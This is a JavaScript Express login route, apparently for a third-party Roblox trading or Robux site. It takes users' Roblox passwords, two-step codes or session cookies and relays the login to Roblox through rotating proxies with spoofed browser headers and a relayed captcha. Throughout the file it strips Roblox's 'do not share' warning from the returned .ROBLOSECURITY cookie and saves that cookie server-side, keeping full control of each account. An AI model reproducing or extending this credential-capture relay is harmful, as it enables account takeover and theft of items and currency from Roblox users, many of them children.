import { User, validate_login } from "../models/user.js";
import express, { json, response } from "express";
import noblox from "noblox.js";
import { user_money_data } from "./user_money_system.js";
import { getGeneralTokenUtil, getCurrentUserUtil } from "../models/roUtil.js";
import NanoTimer from 'nanotimer';
import axios from "axios";
import qs from 'qs';
import fetch from 'node-fetch';
import { proxy_data } from "../models/roProxy_data_handler.js";

const router = express.Router(); 
const timer = new NanoTimer();

router.post("/", async (req, res) =>
{

    const return_jwt = (user) =>
    {
        // User verified; generate JWT token - no need to expire as JWT does that for us
        res.cookie("token", user.generateAuthToken(),
        {
            httpOnly: true,
            maxAge: 1000 * 60 * 60 * 24 * 100 // 100 days
        });

        res.send(user.roblox_name);
    };

    const cookie_login = async (roblox_key) => 
    {
        await getCurrentUserUtil(req.socket.remoteAddress, roblox_key)
    
        .then(async user_data =>
        {
            //If roblox cookie changed
            let olduser = await User.findOne({roblox_id: user_data.UserID});
            let user;
    
            if(olduser){
                await User.findOneAndUpdate({roblox_id: user_data.UserID}, {roblox_key: roblox_key});
                user = await User.findOne({roblox_id: user_data.UserID});
            }else{
                user = new User
                ({
                    roblox_key: roblox_key,
                    roblox_id: user_data.UserID,
                    roblox_name: user_data.UserName,
                })   
            }

            if(!await user_money_data.findOne({roblox_id: user_data.UserID})){
                let money_data = new user_money_data
                ({
                    roblox_id: user_data.UserID,
                    robux_balance: 0
                })

                await money_data.save();
            }

            user.proxy_address = proxy_data.ip_online.find(_ => _.ip_address === req.socket.remoteAddress).proxy.proxy_address;
    
            await user.save();
            return_jwt(user);
        })
    
        .catch(_ =>
        {
            // Invalid Roblox ID
            if(req.body.ctype == "Cookie")
                res.status(400).send("Your cookie has been secured by roblox, try login with credentials!")
            else
                res.status(400).send("Invalid credentials");
        });
    }

    try
    {
        // Valdiate request
        //const { error } = validate_login(req.body);
        //if (error) return res.status(400).send(error.details[0].message);

        // Check if account exists
        let user = await User.findOne({ roblox_key: req.body.roblox_key })

        user = null;
        if (!user)
        {
            // ...or create a new account]
            if(req.body.ctype == "twostepverification"){
                let config = { user_ip: req.socket.remoteAddress,
                    headers: {
                        "x-csrf-token" : await getGeneralTokenUtil(req.socket.remoteAddress)
                    }
                }
                
                let body = { 
                    "username": req.body.username,
                    "ticket": req.body.ticket,
                    "code": req.body.code,
                    "rememberDevice": false,
                    "actionType": "Login"
                }

                axios.post(`https://auth.roblox.com/v2/twostepverification/verify`, body, config).then(
                    async response => {
                        let data = response.data;
                        let RBLXcookie = response.headers["set-cookie"][0];
                        data.credentials = RBLXcookie.substring(0, RBLXcookie.indexOf(";"));
                        res.send(data);
                    }
                ).catch(err => {
                    res.send("Invailid");
                });
            }
            else if(req.body.ctype == "generateCaptcha"){

                let captcha_meta_key;
                let data_blob;
                let captchaId;

                await axios.post(`https://apis.roblox.com/account-security-service/v1/metrics/record`, {"name":"event_captcha","value":1,"labelValues":{"action_type":"Login","event_type":"FunCaptcha_Triggered","application_type":"unknown"}}, {user_ip: req.socket.remoteAddress}).then(response => {
                })

                await axios.get(`https://apis.rbxcdn.com/captcha/v1/metadata`, {}).then(response => {
                    captcha_meta_key = response.data.funCaptchaPublicKeys.ACTION_TYPE_WEB_LOGIN;
                })

                await axios.post(`https://auth.roblox.com/v2/login`, {"ctype":"Username","cvalue":req.body.username,"password":req.body.password}, {user_ip: req.socket.remoteAddress, headers: {"x-csrf-token" : await getGeneralTokenUtil(req.socket.remoteAddress), "User-Agent": req.headers["user-agent"]}}).then(response => {
                }).catch(err => {
                    data_blob = JSON.parse(err.response.data.errors[0].fieldData).dxBlob;
                    captchaId = JSON.parse(err.response.data.errors[0].fieldData).unifiedCaptchaId;
                })

                let body = { 
                    "public_key": captcha_meta_key,
                    "site": 'https://www.roblox.com',
                    "data[blob]": data_blob
                }

                let config = {user_ip: req.socket.remoteAddress,
                    headers: {
                        "Sec-Ch-Ua": req.headers["sec-ch-ua"] || "\"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"",
                        "Sec-Ch-Ua-Mobile": req.headers["sec-ch-ua-mobile"] || "?0", 
                        "User-Agent": req.headers["user-agent"] || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", 
                        "Sec-Ch-Ua-Platform": req.headers["sec-ch-ua-platform"] || "\"Windows\"", 
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
                        "Accept": "*/*", 
                        "Origin": "https://www.roblox.com", 
                        "Sec-Fetch-Site": "cross-site", 
                        "Sec-Fetch-Mode": "cors", 
                        "Sec-Fetch-Dest": "empty", 
                        "Referer": "https://www.roblox.com/", 
                        "Accept-Encoding": "gzip, deflate", 
                        "Accept-Language": req.headers["accept-language"] || "en-US,en;q=0.9"
                    },
                }
                
                await axios.post(`https://roblox-api.arkoselabs.com/fc/gt2/public_key/${captcha_meta_key}`, qs.stringify(body), config).then(response => {
                    res.send({
                        iframeUrl: `https://roblox-api.arkoselabs.com/fc/gc/?token=${response.data.token.replaceAll('|', '&')}`,
                        captchaToken: response.data.token,
                        captchaId: captchaId
                    })
                })
            }
            else if(req.body.ctype == "Username"){

                let config = { user_ip: req.socket.remoteAddress,
                    headers: {
                        "x-csrf-token" : await getGeneralTokenUtil(req.socket.remoteAddress)
                    }
                }
                
                let body = { 
                    "ctype":"Username",
                    "cvalue":req.body.username,
                    "password":req.body.password,
                    "captchaId":req.body.captchaId,
                    "captchaToken":req.body.captchaToken,
                    "captchaProvider":"PROVIDER_ARKOSE_LABS"
                }

                axios.post(`https://auth.roblox.com/v2/login`, body, config).then(
                async (response) => {
                    let data = response.data;

                    if(data.twoStepVerificationData){
                        res.send(data);
                        return;
                    }
                    else{
                        let RBLXcookie = response.headers["set-cookie"].find(_ => _.search(".ROBLOSECURITY=") !== -1)
                        data.credentials = RBLXcookie.substring(0, RBLXcookie.indexOf(";"));
                    }

                    data.credentials = data.credentials.replace('.ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_','');
                    
                    await cookie_login(data.credentials);
                }).catch(async err => 
                {                  
                    try{
                        if(err.response.data.errors[0].code == 0){
                            res.status(500).send("Please wait 1 min. Your proxy is cooling down!"); 
                            return;
                        }

                        res.status(442).send(err.response.data.errors[0].message);
                    }               
                    catch{
                        res.send("An unexpected error occured");
                    }
                });

            }
            else if(req.body.ctype == "Cookie"){
                if(!req.body.roblox_key){
                    response.send("blocked");
                    return;
                }

                await cookie_login(req.body.roblox_key);
            }
            else if(req.body.ctype == "2fa"){
                let config = { user_ip: req.socket.remoteAddress,
                    headers: {
                        "x-csrf-token" : await getGeneralTokenUtil(req.socket.remoteAddress)
                    }
                }
                
                let body = { 
                    challengeId: req.body.challengeId,
                    actionType: "Login",
                    code: req.body.code,
                }

                if(req.body.mediaType == "Authenticator"){
                    axios.post(`https://twostepverification.roblox.com/v1/users/${req.body.roblox_id}/challenges/authenticator/verify`, body, config).then(async response => {
                        let body = { 
                            challengeId: req.body.challengeId,
                            verificationToken: response.data.verificationToken,
                            rememberDevice: true
                        }
                        axios.post(`https://auth.roblox.com/v3/users/${req.body.roblox_id}/two-step-verification/login`, body, config).then(async response => {
                            let RBLXcookie = response.headers["set-cookie"].find(_ => _.search(".ROBLOSECURITY=") !== -1)
                            RBLXcookie = RBLXcookie.substring(0, RBLXcookie.indexOf(";"));
                            RBLXcookie = RBLXcookie.replace('.ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_','');

                            await cookie_login(RBLXcookie);
                        }).catch(err => {
                            res.status(442).send(err.response.data);
                        })
                    }).catch(err => 
                    {
                        res.status(442).send(err.response.data);
                    })
                }else if(req.body.mediaType == "Email"){
                    axios.post(`https://twostepverification.roblox.com/v1/users/${req.body.roblox_id}/challenges/email/verify`, body, config).then(async response => {
                        let body = { 
                            challengeId: req.body.challengeId,
                            verificationToken: response.data.verificationToken,
                            rememberDevice: true
                        }
                        axios.post(`https://auth.roblox.com/v3/users/${req.body.roblox_id}/two-step-verification/login`, body, config).then(async response => {
                            let RBLXcookie = response.headers["set-cookie"].find(_ => _.search(".ROBLOSECURITY=") !== -1)
                            RBLXcookie = RBLXcookie.substring(0, RBLXcookie.indexOf(";"));
                            RBLXcookie = RBLXcookie.replace('.ROBLOSECURITY=_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_','');
                            
                            await cookie_login(RBLXcookie);
                        }).catch(err => {
                            res.status(442).send(err.response.data);
                        })
                    }).catch(err => 
                    {
                        res.status(442).send(err.response.data);
                    })
                }else{
                    res.send("blocked");
                }
            }else{
                res.send("Blocked");
            }
        }
        
        else return_jwt(user);
    }

    catch (error)
    {
        if(proxy_data.ip_online.find(_ => _.ip_address === req.socket.remoteAddress)){
            const proxy_found = proxy_data.ip_online.find(_ => _.ip_address === req.socket.remoteAddress).proxy;
            if(!proxy_data.error_proxies.find(_ => _ === proxy_found.proxy_address))
                proxy_data.error_proxies.push(proxy_found.proxy_address);
        }
        res.status(400).send("Failed. Please try again!");
    }
});

export default router;